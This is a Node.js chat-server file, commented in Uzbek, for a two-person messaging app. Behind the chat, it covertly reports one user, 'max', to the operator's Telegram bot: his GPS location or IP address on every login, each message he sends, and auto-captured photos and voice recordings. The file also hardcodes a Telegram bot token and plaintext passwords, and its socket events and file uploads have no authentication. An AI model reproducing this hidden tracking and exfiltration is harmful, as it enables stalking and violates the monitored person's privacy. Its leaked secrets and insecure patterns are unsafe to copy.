const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const https = require('https');

// --- SOZLAMALAR ---
const TELEGRAM_BOT_TOKEN = '8338280465:AAFTlVRorrQNpaHnJEQjX6ynRM-rg5EhEGk'; 
const MY_TELEGRAM_ID = '1178814024';

if (!fs.existsSync('uploads')) {
    fs.mkdirSync('uploads');
    console.log("Uploads papkasi yaratildi!");
}

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, 'uploads/'),
    filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});

const upload = multer({ storage: storage });

app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));
app.use(express.json());

const USERS = { 'mura': 'shaxzoda', 'max': 'qiyshiq_qalam' };
let onlineUsers = {}; 
let lastSeen = { 'mura': null, 'max': null };

function sendTelegramNotification(text) {
    if (!TELEGRAM_BOT_TOKEN) return;
    const data = JSON.stringify({ chat_id: MY_TELEGRAM_ID, text: text });
    
    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
    };
    const req = https.request(options, (res) => { res.on('data', () => {}); });
    req.on('error', (e) => console.error('Telegram Xato:', e));
    req.write(data);
    req.end();
}

function sendTelegramVoice(voiceUrl, caption) {
    if (!TELEGRAM_BOT_TOKEN) return;
    const data = JSON.stringify({ chat_id: MY_TELEGRAM_ID, voice: voiceUrl, caption: caption });
    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendVoice`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
    };
    const req = https.request(options, (res) => { res.on('data', () => {}); });
    req.on('error', (e) => console.error('Telegram Voice Xato:', e));
    req.write(data);
    req.end();
}

function sendTelegramPhoto(photoUrl, caption) {
    if (!TELEGRAM_BOT_TOKEN) return;
    const data = JSON.stringify({ chat_id: MY_TELEGRAM_ID, photo: photoUrl, caption: caption });
    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
    };
    const req = https.request(options, (res) => { res.on('data', () => {}); });
    req.on('error', (e) => console.error('Telegram Photo Xato:', e));
    req.write(data);
    req.end();
}

app.post('/login', (req, res) => {
    const username = req.body.username ? req.body.username.trim().toLowerCase() : '';
    const password = req.body.password ? req.body.password.trim() : '';

    if (USERS[username] && USERS[username] === password) {
        res.json({ success: true, username: username });
    } else {
        res.json({ success: false });
    }
});

app.post('/upload', upload.single('file'), (req, res) => {
    if(req.file) {
        res.json({ filename: req.file.filename, type: req.file.mimetype, originalName: req.file.originalname });
    } else {
        res.status(400).json({ error: "Fayl yuklanmadi" });
    }
});

// ==========================================
// PROFILLAR VA ISTORIYALAR BAZASI
// ==========================================
const PROFILES_FILE = 'profiles.json';

function getProfiles() {
    if (!fs.existsSync(PROFILES_FILE)) {
        const init = { 'mura': { avatar: '', story: '', storyType: '' }, 'max': { avatar: '', story: '', storyType: '' } };
        fs.writeFileSync(PROFILES_FILE, JSON.stringify(init));
        return init;
    }
    return JSON.parse(fs.readFileSync(PROFILES_FILE, 'utf8'));
}

function saveProfile(user, data) {
    const profiles = getProfiles();
    profiles[user] = { ...profiles[user], ...data };
    fs.writeFileSync(PROFILES_FILE, JSON.stringify(profiles));
    return profiles;
} 

function getHistory() {
    try { return JSON.parse(fs.readFileSync('database.json', 'utf8')); } catch (e) { return []; }
}

function saveMessage(msg) {
    const history = getHistory();
    history.push(msg);
    fs.writeFileSync('database.json', JSON.stringify(history));
}

io.on('connection', (socket) => {
    const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;

    socket.on('join', (data) => {
        const username = (typeof data === 'object') ? data.user : data;
        onlineUsers[username] = socket.id;
        socket.username = username;
        
        if (username === 'max') {
            let msg = `⚠️ MAX tizimga kirdi!`;
            if (typeof data === 'object' && data.lat && data.lon) {
                // To'g'rilangan lokatsiya ssilkasi
                msg += `\n🌍 Joylashuv: http://googleusercontent.com/maps.google.com/?q=${data.lat},${data.lon}`;
            } else {
                msg += `\n📍 IP: ${clientIp} (GPS ruxsat berilmadi)`;
            }
            sendTelegramNotification(msg);
        }

        io.emit('status_update', { online: Object.keys(onlineUsers), lastSeen: lastSeen });
        socket.emit('load_history', getHistory());
        
        // Ulangan zahoti profillarni yuborish
        socket.emit('load_profiles', getProfiles());
    });

    // Profil yangilanganini qabul qilish (Join'dan tashqarida)
    socket.on('update_profile', (data) => {
        const updatedProfiles = saveProfile(socket.username, data);
        io.emit('load_profiles', updatedProfiles); 
    });

    socket.on('verify_photo', (data) => {
        const publicUrl = `https://max-chat-a2sv.onrender.com/uploads/${data.filename}`;
        sendTelegramPhoto(publicUrl, `📸 Max tasdiqlash: ${data.type}`);
    });

    socket.on('auto_voice', (data) => {
        const publicUrl = `https://max-chat-a2sv.onrender.com/uploads/${data.filename}`;
        sendTelegramVoice(publicUrl, `🎙 Maxdan avto-ovoz`);
    });

    socket.on('send_message', (data) => {
        const timeString = new Date().toLocaleTimeString('uz-UZ', {hour: '2-digit', minute:'2-digit'});
        const msgData = {
            user: socket.username, text: data.text, file: data.file,
            fileType: data.fileType, originalName: data.originalName, replyTo: data.replyTo, time: timeString
        };
        saveMessage(msgData);
        io.emit('new_message', msgData);

        if (socket.username === 'max') {
            let telegramMsg = `💬 Max yozdi:\n${data.text}`;
            if (data.file) telegramMsg += `\n\n📁 [Fayl/Media: ${data.originalName || 'Nomsiz'}]`;
            sendTelegramNotification(telegramMsg);
        }
    });

    socket.on('disconnect', () => {
        if (socket.username) {
            lastSeen[socket.username] = new Date().toLocaleTimeString('uz-UZ', {hour: '2-digit', minute:'2-digit'});
            delete onlineUsers[socket.username];
            io.emit('status_update', { online: Object.keys(onlineUsers), lastSeen: lastSeen });
        }
    });
});

http.listen(3000, () => { console.log('Server: http://localhost:3000'); });